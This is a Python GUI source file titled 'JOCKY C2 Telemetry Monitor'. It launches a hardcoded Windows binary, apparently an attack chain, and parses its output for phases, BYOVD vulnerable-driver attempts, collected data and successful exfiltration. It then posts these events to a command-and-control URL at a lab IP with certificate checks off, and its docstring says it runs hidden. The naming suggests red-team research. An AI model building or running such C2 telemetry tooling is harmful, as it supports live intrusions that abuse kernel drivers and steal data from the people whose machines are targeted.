#!/usr/bin/env python3
"""
JOCKY C2 Telemetry GUI - Standalone Windows Application

Simple GUI that:
1. Starts automatically when you run it
2. Launches the JOCKY binary in background
3. Captures telemetry and sends to C2
4. Shows real-time status
5. No terminal window (runs hidden)

Hardcoded settings (change in code below if needed):
- BINARY_PATH: Z:\research_chain_windows_production.exe
- C2_URL: http://192.168.56.1:8443/api/telemetry/report
- CHAIN_ID: research_chain_v4
"""

import tkinter as tk
from tkinter import scrolledtext, messagebox
import subprocess
import threading
import json
import time
from datetime import datetime
import requests
from pathlib import Path
import sys
import re
from typing import Dict, Any, List

# ===== HARDCODED CONFIGURATION =====
# TODO: Move to config file later
BINARY_PATH = r"Z:\research_chain_windows_production.exe"
C2_URL = "http://192.168.56.1:8443/api/telemetry/report"
CHAIN_ID = "research_chain_v4"
BATCH_INTERVAL = 10  # seconds
MAX_RETRIES = 3

# ===== EVENT PATTERNS =====
PATTERNS = {
    "phase_start": r"\[\*\]\s+Phase\s+(\d+):\s+(.+?)(?:\s*\(|$)",
    "phase_complete": r"\[\+\]\s+(.+?)\s+phase\s+complete",
    "driver_attempt": r"\[BYOVD\]\s+Trying driver:\s+(.+?\.sys)",
    "device_open_ok": r"\[BYOVD\]\s+Device handle:\s+OK",
    "device_open_fail": r"\[BYOVD\]\s+Device open FAILED\s+\(err=(\d+)\)",
    "data_collected": r"\[\+\]\s+Data Collection:\s+(\d+)\s+bytes",
    "exfil_sent": r"\[\+\]\s+(\w+)\s+exfiltration\s+successful",
    "forensic_complete": r"\[\+\]\s+Forensic\s+(?:analysis\s+)?phase\s+complete",
}

class TelemetryGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("JOCKY C2 Telemetry Monitor")
        self.root.geometry("800x600")
        self.root.configure(bg="#0d0d0d")

        self.events: List[Dict[str, Any]] = []
        self.current_phase = 0
        self.process = None
        self.running = True

        self.setup_ui()
        self.start_binary()

    def setup_ui(self):
        """Create the GUI"""
        # Status bar
        status_frame = tk.Frame(self.root, bg="#1a1a1a", height=40)
        status_frame.pack(side=tk.TOP, fill=tk.X, padx=10, pady=10)

        tk.Label(
            status_frame,
            text="🔴 Waiting for binary...",
            bg="#1a1a1a",
            fg="#00ff00",
            font=("Courier", 10, "bold")
        ).pack(side=tk.LEFT)
        self.status_label = status_frame.winfo_children()[0]

        # Metrics
        metrics_frame = tk.Frame(self.root, bg="#0d0d0d")
        metrics_frame.pack(fill=tk.X, padx=10, pady=5)

        tk.Label(metrics_frame, text="Phase: 0/12", bg="#0d0d0d", fg="#00ccff",
                font=("Courier", 9)).pack(side=tk.LEFT, padx=10)
        self.phase_label = metrics_frame.winfo_children()[0]

        tk.Label(metrics_frame, text="Events: 0", bg="#0d0d0d", fg="#00ccff",
                font=("Courier", 9)).pack(side=tk.LEFT, padx=10)
        self.events_label = metrics_frame.winfo_children()[-1]

        tk.Label(metrics_frame, text="Status: Starting", bg="#0d0d0d", fg="#ffaa00",
                font=("Courier", 9)).pack(side=tk.LEFT, padx=10)
        self.event_status_label = metrics_frame.winfo_children()[-1]

        # Output window
        output_frame = tk.Frame(self.root, bg="#0d0d0d")
        output_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        tk.Label(output_frame, text="Real-time Events:", bg="#0d0d0d", fg="#00ff00",
                font=("Courier", 9, "bold")).pack(anchor="w")

        self.output = scrolledtext.ScrolledText(
            output_frame,
            height=25,
            width=100,
            bg="#1a1a1a",
            fg="#00ff00",
            font=("Courier", 8),
            insertbackground="#00ff00"
        )
        self.output.pack(fill=tk.BOTH, expand=True)

        # Configure colors for event types
        self.output.tag_config("success", foreground="#00ff00")
        self.output.tag_config("failure", foreground="#ff4444")
        self.output.tag_config("pending", foreground="#ffaa00")
        self.output.tag_config("info", foreground="#00ccff")

    def log(self, msg: str, tag: str = "info"):
        """Add message to output window"""
        self.output.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n", tag)
        self.output.see(tk.END)
        self.root.update()

    def start_binary(self):
        """Launch binary in background thread"""
        def run_binary():
            try:
                self.log(f"Starting: {BINARY_PATH}", "pending")
                self.process = subprocess.Popen(
                    [BINARY_PATH],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1
                )
                self.status_label.config(text="🟢 Binary running", fg="#00ff00")
                self.log("Binary started - capturing output", "success")

                # Read output line by line
                while self.running and self.process.poll() is None:
                    line = self.process.stdout.readline()
                    if line:
                        self.parse_line(line.strip())
                        self.log(line.strip(), "info")

                        # Send batches periodically
                        if len(self.events) >= 5:
                            self.send_batch()

                # Send remaining events
                if self.events:
                    self.send_batch()

                self.status_label.config(text="⚫ Binary finished", fg="#ffaa00")
                self.log("Binary execution complete", "success")

            except FileNotFoundError:
                self.log(f"ERROR: Binary not found at {BINARY_PATH}", "failure")
                self.status_label.config(text="❌ Binary not found", fg="#ff4444")
            except Exception as e:
                self.log(f"ERROR: {e}", "failure")
                self.status_label.config(text="❌ Error", fg="#ff4444")

        thread = threading.Thread(target=run_binary, daemon=True)
        thread.start()

    def parse_line(self, line: str):
        """Parse console output for telemetry events"""
        # Phase start
        match = re.search(PATTERNS["phase_start"], line)
        if match:
            phase = int(match.group(1))
            name = match.group(2).strip()
            self.current_phase = phase
            self.events.append({
                "timestamp": datetime.utcnow().isoformat() + "Z",
                "chain_id": CHAIN_ID,
                "event_type": "phase_start",
                "phase": phase,
                "status": "pending",
                "details": {"phase_name": name}
            })
            self.phase_label.config(text=f"Phase: {phase}/12")
            self.event_status_label.config(text=f"Status: {name}")
            return

        # Driver attempt
        match = re.search(PATTERNS["driver_attempt"], line)
        if match:
            driver = match.group(1)
            self.events.append({
                "timestamp": datetime.utcnow().isoformat() + "Z",
                "chain_id": CHAIN_ID,
                "event_type": "driver_attempt",
                "phase": self.current_phase,
                "status": "pending",
                "details": {"driver_name": driver}
            })
            return

        # Device open success/failure
        if re.search(PATTERNS["device_open_ok"], line):
            if self.events and self.events[-1].get("event_type") == "driver_attempt":
                self.events[-1]["status"] = "success"
            return

        match = re.search(PATTERNS["device_open_fail"], line)
        if match:
            err = match.group(1)
            if self.events and self.events[-1].get("event_type") == "driver_attempt":
                self.events[-1]["status"] = "failure"
                self.events[-1]["details"]["error_code"] = int(err)
            return

        # Data collected
        match = re.search(PATTERNS["data_collected"], line)
        if match:
            size = int(match.group(1))
            self.events.append({
                "timestamp": datetime.utcnow().isoformat() + "Z",
                "chain_id": CHAIN_ID,
                "event_type": "data_collected",
                "phase": self.current_phase,
                "status": "success",
                "details": {"size_bytes": size}
            })
            return

        # Exfil sent
        match = re.search(PATTERNS["exfil_sent"], line)
        if match:
            channel = match.group(1).lower()
            self.events.append({
                "timestamp": datetime.utcnow().isoformat() + "Z",
                "chain_id": CHAIN_ID,
                "event_type": "exfil_sent",
                "phase": self.current_phase,
                "status": "success",
                "details": {"channel": channel}
            })
            return

    def send_batch(self):
        """Send accumulated events to C2"""
        if not self.events:
            return

        for event in self.events:
            for attempt in range(MAX_RETRIES):
                try:
                    response = requests.post(
                        C2_URL,
                        json=event,
                        timeout=5,
                        verify=False
                    )
                    if response.status_code in (200, 201, 202):
                        self.log(f"✓ Sent {event.get('event_type')}", "success")
                        break
                except Exception as e:
                    if attempt == MAX_RETRIES - 1:
                        self.log(f"✗ Failed to send {event.get('event_type')}: {e}", "failure")
                    time.sleep(2 ** attempt)

        self.events.clear()
        self.events_label.config(text=f"Events: {len(self.events)}")

    def on_close(self):
        """Cleanup on exit"""
        self.running = False
        if self.process:
            self.process.terminate()
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    gui = TelemetryGUI(root)
    root.protocol("WM_DELETE_WINDOW", gui.on_close)
    root.mainloop()
